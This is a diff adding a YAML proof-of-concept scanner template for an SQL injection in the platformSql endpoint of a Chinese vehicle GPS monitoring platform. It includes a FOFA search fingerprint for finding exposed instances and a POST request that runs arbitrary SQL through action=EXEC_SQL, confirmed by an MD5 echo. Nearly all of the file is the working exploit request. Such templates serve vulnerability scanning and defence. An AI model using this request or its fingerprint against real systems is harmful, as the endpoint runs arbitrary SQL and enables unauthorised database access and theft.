@@ -1,0 +1,19 @@
+id: poc-yaml-31gps-platformSql-sqli
+info:
+  name: 三一谦成 车辆监控服务平台 platformSql SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 车辆监控服务平台
+  fofa: body="gps-web" && body="<title>欢迎光临"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /gps-web/platformSql
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=EXEC_SQL&params=SELECT md5({{.t1}})
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
